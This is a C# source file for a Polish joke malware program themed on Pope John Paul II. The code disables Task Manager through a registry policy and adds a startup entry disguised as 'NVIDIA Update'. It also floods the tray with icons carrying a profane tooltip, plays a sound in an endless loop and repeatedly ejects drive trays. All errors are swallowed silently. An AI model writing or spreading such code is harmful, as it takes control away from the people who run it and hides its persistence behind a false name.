using System.Drawing;
using System.IO;
using System.Media;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace dllsupport;

public class Funkcje
{
	public static bool tackaBool = false;

	public static bool tackaWhile = true;

	public static void insertKremowka()
	{
		MessageBox.Show("Insert Kremówka", "Jan Paweł 2 - Aplikacja");
	}

	public static void KillCtrlAltDelete()
	{
		try
		{
			string value = "1";
			string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey.SetValue("DisableTaskMgr", value);
				registryKey.Close();
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public static void notifyIcon()
	{
		for (int i = 0; i <= 25; i = checked(i + 1))
		{
			NotifyIcon notifyIcon = new NotifyIcon();
			notifyIcon.Icon = new Icon(Assembly.GetExecutingAssembly().GetManifestResourceStream("dllsupport.Resources.papieszIkonka.ico"));
			notifyIcon.Text = "i co teraz kurwa?";
			notifyIcon.Visible = true;
		}
	}

	public static void wysuniecieTacki()
	{
		while (tackaWhile)
		{
			if (!tackaBool)
			{
				continue;
			}
			try
			{
				string text = "aąbcćdeęfghijklłmnńoóprsśtuwyzźż";
				string text2 = text;
				for (int i = 0; i < text2.Length; i++)
				{
					EjectMedia.Eject("\\\\.\\" + text2[i] + ":");
				}
				tackaBool = false;
			}
			catch
			{
			}
		}
	}

	public static void playSound()
	{
		try
		{
			while (true)
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("dllsupport.Resources.Jan_DJ_2_-_GabBarka.wav");
				SoundPlayer soundPlayer = new SoundPlayer();
				soundPlayer.Stream = manifestResourceStream;
				soundPlayer.PlaySync();
			}
		}
		catch
		{
		}
	}

	public static void autorun()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("NVIDIA Update", Application.ExecutablePath.ToString());
	}
}
